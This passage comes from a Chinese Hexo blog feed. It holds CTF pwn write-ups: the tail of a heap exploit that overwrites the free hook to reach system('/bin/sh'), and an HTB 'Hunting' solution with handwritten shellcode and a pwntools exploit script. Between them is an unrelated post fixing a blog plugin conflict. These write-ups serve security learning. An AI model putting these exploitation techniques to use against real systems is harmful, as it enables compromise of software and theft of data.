class="string">'3'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">8</span>, (<span class="number">0x7fffffff</span><span class="number">-8</span>+<span class="number">1</span>),<span class="number">0x40</span>*<span class="string">'1'</span>+p64(<span class="number">0x51</span>)+p64(free_hook<span class="number">-0x30</span>) )</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x40</span>,<span class="string">'3'</span>*<span class="number">0x20</span>+p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.anquanke.com/post/id/244018" target="_blank" rel="noopener">https://www.anquanke.com/post/id/244018</a></p><p><a href="https://www.anquanke.com/post/id/242640#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242640#h2-2</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</title>
      <link href="/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/"/>
      <url>/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/</url>
      
        <content type="html"><![CDATA[<p>今天强迫症又双发作，这次没忍住，折腾了下。重于把hexo-helper-live2d 与busuanzi 两个插件共存时产生冲突的问题解决了。<a id="more"></a></p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>未安装live2d且不蒜子配置正常，执行<code>npm install --save hexo-helper-live2d</code>后，不蒜子计数冲突不显示计数。<br>已安装live2d但<code>live2d.enable</code>由<code>true</code>改为<code>false</code>后，不蒜子显示计数。</p><p>同时正常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>异常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1.打开footer.ejs文件，找到与不蒜子相关的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_site_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_page_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;page-visit&quot;  title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>2.删除<code>&lt;span id=&quot;busuanzi_container_page_pv&quot; style=&#39;display:inline&#39;&gt;</code>和<code>&lt;span id=&quot;busuanzi_container_site_pv&quot; style=&#39;display:inline&#39;&gt;</code>语句。</p><p>3.在<code>&lt;% if (theme.visit_counter.on) { %&gt;</code>语句后，添加<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">     &lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">&lt;script async&#x3D;&quot;&quot; src&#x3D;&quot;https:&#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">         &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     &lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">                 &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;page-visit&quot;  title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     &lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">         &lt;&#x2F;div&gt;</span><br><span class="line">     &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>4.打开<code>after-footer.ejs</code>，删除<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>.</p>]]></content>
      
      
      <categories>
          
          <category> Yelee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> problem_resolve </tag>
            
            <tag> node-js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hunting— HTB  PWN  challenge</title>
      <link href="/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/"/>
      <url>/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/</url>
      
        <content type="html"><![CDATA[<p>一道htb中，比较有意思的手写shellcode题。<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>如上，题目是一个32位程序，且保护只开了PIE并开放了读写执行权限。</p><p>分析程序主要流程我们可以看到：</p><p><img src="image-20211102210710626.png" alt="image-20211102210710626"></p><p>程序先mmap一段空间，将flag如这个空间中。</p><p>再用meset把flag原本存放的空间清零。</p><p>然后我们有大小为0x3c来写入我们的后门。</p><p>但是题目设置seccomp沙箱，禁用一些系统调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0002: 0x35 0x0a 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0013</span><br><span class="line"> 0003: 0x15 0x09 0x00 0x0000000b  if (A &#x3D;&#x3D; execve) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x00000166  if (A &#x3D;&#x3D; execveat) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000127  if (A &#x3D;&#x3D; openat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000005  if (A &#x3D;&#x3D; open) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000006  if (A &#x3D;&#x3D; close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000008  if (A &#x3D;&#x3D; creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000056  if (A &#x3D;&#x3D; uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000002  if (A &#x3D;&#x3D; fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x000000be  if (A &#x3D;&#x3D; vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>由于禁用了execve和open导致我们无法常规getshell或orw</p><p>但经过gdb，我们发现，由于开了PIE,flag的位置是随机的，但是flag位置大小于<code>0x60000000</code>.</p><p><img src="image-20211103102846331.png" alt="image-20211103102846331"></p><p>再进一步分析，可以看到flag在段地址开始的位置。所以我们以<code>0x1000</code>遍历地址，我们就可以发现flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gs 0x6b6d0000</span><br><span class="line">warning: Unable to display strings with size &#39;g&#39;, using &#39;b&#39; instead.</span><br><span class="line">0x6b6d0000:     &quot;HTB&#123;&quot;, &#39;X&#39; &lt;repeats 31 times&gt;, &quot;&#125;&quot;</span><br><span class="line">0x6b6d0025:     &quot;&quot;</span><br><span class="line">0x6b6d0026:     &quot;&quot;</span><br><span class="line">0x6b6d0027:     &quot;&quot;</span><br><span class="line">0x6b6d0028:     &quot;&quot;</span><br><span class="line">0x6b6d0029:     &quot;&quot;</span><br><span class="line">0x6b6d002a:     &quot;&quot;</span><br><span class="line">0x6b6d002b:     &quot;&quot;</span><br><span class="line">0x6b6d002c:     &quot;&quot;</span><br><span class="line">0x6b6d002d:     &quot;&quot;</span><br><span class="line">0x6b6d002e:     &quot;&quot;</span><br><span class="line">0x6b6d002f:     &quot;&quot;</span><br><span class="line">0x6b6d0030:     &quot;&quot;</span><br><span class="line">0x6b6d0031:     &quot;&quot;</span><br><span class="line">0x6b6d0032:     &quot;&quot;</span><br><span class="line">0x6b6d0033:     &quot;&quot;</span><br><span class="line">0x6b6d0034:     &quot;&quot;</span><br><span class="line">0x6b6d0035:     &quot;&quot;</span><br><span class="line">0x6b6d0036:     &quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="如何定位flag"><a href="#如何定位flag" class="headerlink" title="如何定位flag"></a>如何定位flag</h2><h3 id="access函数"><a href="#access函数" class="headerlink" title="access函数"></a>access函数</h3><p>经过查阅资料后我们可以发现access函数不仅可以判断某文件名是否存在还在可以判断某地址段是否存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access(<span class="keyword">const</span> <span class="keyword">char</span> *filename,<span class="keyword">int</span> mode);</span><br></pre></td></tr></table></figure><p>当mode 为0 时，判断是否存在。</p><p>当mode 为1时，判断是否有执行权限。</p><p>当mode 为2时，判断是否有写权限。</p><p>当mode 为3时，判断是否有读权限。</p><p>filename参数既可以传入文件名，也可以虚拟内存地址。</p><h3 id="for-循环查找"><a href="#for-循环查找" class="headerlink" title="for 循环查找"></a>for 循环查找</h3><p>由于用access函数，我们可以以<code>0x1000</code>为一个单位来慢慢遍历。</p><p>用c伪代码来表达就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> address = <span class="number">0x60000000</span>; address &lt; <span class="number">0x7fffffff</span>; address += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (access(address + i +<span class="number">4</span>) == EFAULT)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">1</span>, address, <span class="number">0x26</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用汇编来表达就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov edx,0x5fffffff;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">notaccess:</span><br><span class="line">or dx,0xfff;</span><br><span class="line">inc edx;</span><br><span class="line">mov eax,0x21;</span><br><span class="line">lea  ebx,[edx+4]</span><br><span class="line">int 0x80</span><br><span class="line">cmp eax,0xfffffff2;</span><br><span class="line">jz  notaccess;</span><br><span class="line">mov eax,0x04;</span><br><span class="line">mov ebx,1;</span><br><span class="line">mov ecx,edx;</span><br><span class="line">mov edx,0x26</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/02 19:51:09</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hunting'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'178.62.96.143'</span>,<span class="number">30132</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">shell=<span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx,0x5fffffff;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">notaccess:</span></span><br><span class="line"><span class="string">or dx,0xfff;</span></span><br><span class="line"><span class="string">inc edx;</span></span><br><span class="line"><span class="string">mov eax,0x21;</span></span><br><span class="line"><span class="string">lea  ebx,[edx+4]</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">cmp eax,0xfffffff2;</span></span><br><span class="line"><span class="string">jz  notaccess;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x04;</span></span><br><span class="line"><span class="string">mov ebx,1;</span></span><br><span class="line"><span class="string">mov ecx,edx;</span></span><br><span class="line"><span class="string">mov edx,0x26</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(asm(shell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="知识点小记"><a href="#知识点小记" class="headerlink" title="知识点小记"></a>知识点小记</h2><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>有几个汇编指令搞忘了，在这里小记下。</p><p>lea  x,[y]</p><p>取y对应的地址作为x的值存入。</p><p>mov x,[y]</p><p>取y对应的地址的值作为x的值存入。</p><p>or  x,y</p><p>对x,y进行或运算，并将值存入x中。</p><p>xor x,y</p><p>xor异或运算,当x,y两个不同时结果为1,否则为0.在汇编中有时也用于清零操作，例如 <code>xor eax,eax</code> 清空eax寄存器。</p><h3 id="延长程序时间"><a href="#延长程序时间" class="headerlink" title="延长程序时间"></a>延长程序时间</h3><p>在看大佬博客<a href="https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。" target="_blank" rel="noopener">https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alarm(<span class="keyword">unsigned</span> <span class="keyword">int</span> seconds);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xman的leve5另一种解法(mprotect)学习与利用</title>
      <link href="/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>当时在xman听大佬将leve5利用时，很疑惑要调用mprotect，明明可以溢出执行<code>system(&#39;/bin/sh&#39;)</code>了. 直到我遇到些奇怪的静态编译题,我真香了故小记一下<a id="more"></a></p><h2 id="mprotect-函数"><a href="#mprotect-函数" class="headerlink" title="mprotect()函数"></a><code>mprotect()</code>函数</h2><p>在Linux中，<code>mprotect()</code>函数可以用来修改一段指定内存区域的保护属性。mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p><p>使用方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><p>常规使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(addr, len, <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p>start表示一块代码段的起始位置。</p><p>len表示要修改长度，len的大小如果过小，libc会自动来补齐的。</p><p>port 表示权限 即使读（4）写（2）执行（1）</p><h2 id="leve5-exp"><a 